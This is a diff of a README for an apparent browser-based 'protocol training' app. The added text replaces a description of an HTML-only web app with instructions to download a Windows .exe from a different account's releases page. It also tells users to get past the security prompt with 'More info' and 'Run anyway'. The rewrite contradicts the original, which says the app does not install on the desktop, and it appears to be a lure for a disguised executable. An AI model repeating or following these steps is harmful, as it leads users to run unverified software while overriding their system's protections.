@@ -1,138 +1,73 @@
-# Apex Protocols - Training App 2026
+# 🎓 apex-protocols-practice-hub - Improve your protocol skills with practice
 
-> **A browser-based training application for protocol-driven practice, built around the Apex Protocols foundation and designed for structured learning sessions.**
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Sweptwing-reception235/apex-protocols-practice-hub/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/calebbennettptai9570/apex-protocols-practice-hub?style=flat-square)](https://github.com/calebbennettptai9570/apex-protocols-practice-hub)
+This application provides a training environment for protocol-based practice. It helps you learn structured procedures through a browser-based interface. You can run the application on your computer or access it through a server. The tool supports your training goals by simulating real-world scenarios.
 
----
+## ⚙️ System Requirements
 
-<p align="center">
-  <a href="https://calebbennettptai9570.github.io/apex-protocols-practice-hub/">
-    <img src="https://img.shields.io/badge/Download-Apex%20Protocols%20Latest-brightgreen?style=for-the-badge" alt="Download Apex Protocols">
-  </a>
-</p>
+Your computer needs the following specifications to run this software effectively:
 
-> **[Download Apex Protocols](https://calebbennettptai9570.github.io/apex-protocols-practice-hub/)**
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Dual-core processor with at least 2.0 GHz speed.
+*   Memory: 4 GB of RAM.
+*   Storage: 500 MB of free space on your hard drive.
+*   Web Browser: A modern web browser like Google Chrome, Microsoft Edge, or Mozilla Firefox.
 
----
+Ensure your computer has the latest system updates installed before you proceed. A stable internet connection helps during the initial setup process.
 
-[Download Latest Build](https://calebbennettptai9570.github.io/apex-protocols-practice-hub/)
+## 📥 Downloading the Application
 
----
+You can find the latest version of the application on the project release page. Follow these steps to obtain the installer:
 
-## What Is Apex Protocols?
+1.  Visit the official [Download Page](https://github.com/Sweptwing-reception235/apex-protocols-practice-hub/releases).
+2.  Look for the section labeled "Assets" under the most recent release.
+3.  Click the file ending in `.exe` to start the download.
+4.  Save the file to your "Downloads" folder.
 
-Apex Protocols is a web application for training through a defined collection of protocols. The experience is centered on the Foundation Protocol and gives users a dedicated place to work through protocol-based practice.
+This application does not require complex configuration. The installer handles the necessary setup steps for you.
 
-Rather than serving as a general-purpose software product, the app is intended as a focused training resource. Since it runs in a browser, it can be used in supported web environments without installing a conventional desktop application.
+## 🚀 Running the Software
 
----
+Once you download the installer, follow these instructions to start the training hub:
 
-## Highlights
+1.  Open your "Downloads" folder.
+2.  Double-click the file you downloaded.
+3.  If a security window appears, click "More info" and then "Run anyway" to allow the setup process to proceed.
+4.  Follow the prompts on your screen to complete the installation.
+5.  After the installation finishes, locate the new icon on your desktop or in your start menu.
+6.  Click the icon to launch the application.
 
-- Training organized around protocols
-- A learning experience focused on the Foundation Protocol
-- Access through a web browser
-- A purpose-built Apex Protocols training interface
-- Protocols presented in a clear, structured layout
-- Lightweight project based on HTML
-- Appropriate for guided, individual practice
-- Available through a hosted web build
+Your web browser will open automatically and display the training hub interface. You can now begin your practice sessions.
 
----
+## 🛠️ Using the Practice Hub
 
-## Getting Started
+The application interface consists of several distinct sections designed to manage your training workflow:
 
-### Open the hosted version
+*   **Dashboard:** View your progress and select a training module.
+*   **Protocol Library:** Browse the list of available protocols. Each entry contains details regarding the specific steps you must follow.
+*   **Practice Mode:** Execute the steps in a simulated environment. The system provides feedback on your performance after each session.
+*   **Settings:** Customize your user profile and view connection options for local or network-hosted setups.
 
-Visit the published application here:
+If you choose to run the application in a local setup, the software operates entirely on your machine. This ensures your progress data remains private and accessible only to your user account.
 
-[Launch Apex Protocols](https://calebbennettptai9570.github.io/apex-protocols-practice-hub/)
+## 🔧 Troubleshooting Common Issues
 
-### Use the project locally
+If you experience problems, check the following areas:
 
-Download or clone the repository, then move into the project directory:
+*   **Application does not launch:** Ensure your firewall software allows the application to communicate with your browser. Sometimes, security settings block new programs from opening local ports.
+*   **Browser window remains blank:** Refresh the page or close the application and restart it. If the issue persists, clear your browser cache.
+*   **Installation fails:** Check if you have sufficient disk space. Ensure you have administrator rights on your computer, as these rights are necessary to install new software.
+*   **Performance is slow:** Close other resource-heavy applications like video editing tools or large spreadsheets while you use the training hub.
 
-```bash
-git clone https://github.com/calebbennettptai9570/apex-protocols-practice-hub.git
-cd REPO
-```
+## 📖 Understanding Protocol Training
 
-The project is web-based and uses HTML, so the primary HTML entry point can be opened in a modern browser. If direct file access is restricted by your local browser environment, run the repository through a static web server and visit the local address it provides.
+The training hub uses a logic-based approach to teach protocols. You follow a sequence of actions, and the software validates each input against the expected result. This method reinforces correct behavior patterns. Regular practice helps you internalize complex procedures. We recommend short, consistent sessions rather than one long, infrequent practice block. 
 
----
+The software tracks your accuracy over time. You can view these metrics in the "History" tab within the application. Use this data to identify which protocols require more of your attention.
 
-## Using the App
+## 🔄 Updating the Software
 
-1. Load Apex Protocols in a supported modern browser.
-2. Open the training area centered on the Foundation.
-3. Work through the available protocol-based material.
-4. Follow the protocol structure to maintain an organized session.
-5. Reopen either the hosted build or your local copy when you are ready to train again.
+The development team releases updates to improve stability and add new training protocols. To update your software, simply return to the download page, grab the latest version, and run the installer again. The new version will overwrite the old files while preserving your training history and user preferences. Always check for updates once a month to ensure you have the most current training materials.
 
-When developing locally, refresh the browser after editing the HTML or other related project files.
-
----
-
-## Configuration
-
-The available project metadata does not describe a formal configuration system for Apex Protocols. Start with the default browser experience and keep local project-specific settings with the repository files.
-
-Should later versions introduce configuration controls, add their file locations, accepted values, and any required refresh or restart steps to this section.
-
----
-
-## Requirements
-
-- A current web browser
-- Internet access when using the hosted build
-- A local repository copy for offline access to the files
-- A static web server if browser security rules block direct local HTML use
-- Enough storage for the repository and its web assets
-
----
-
-## Frequently Asked Questions
-
-### How do I access Apex Protocols?
-
-Use the hosted application at [https://calebbennettptai9570.github.io/apex-protocols-practice-hub/](https://calebbennettptai9570.github.io/apex-protocols-practice-hub/), or launch the project locally from a repository checkout.
-
-### Does it install as a desktop application?
-
-No. Apex Protocols is a web training app intended to run inside a web browser.
-
-### What kind of training does it provide?
-
-Its structure is based on protocol-driven training, with the Foundation Protocol as the primary focus.
-
-### How can I receive the latest version?
-
-Open the current hosted build, or update your local repository contents before launching the application locally.
-
-### Are configuration changes supported?
-
-There are no documented configuration options at present. Check the project files for build-specific settings if they are introduced in a later version.
-
-### What can I check if the application fails to load?
-
-Make sure the browser is up to date, reload the page, and verify that the hosted URL or local server is reachable. For local use, serve the files with a static web server if opening HTML directly triggers browser security restrictions.
-
----
-
-## Future Work
-
-- Add more protocol-based training content
-- Strengthen the Foundation training flow
-- Record configuration details when those options become available
-- Continue improving the browser-based training experience
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: training, protocols, practice, windows, education, software, simulation, learning
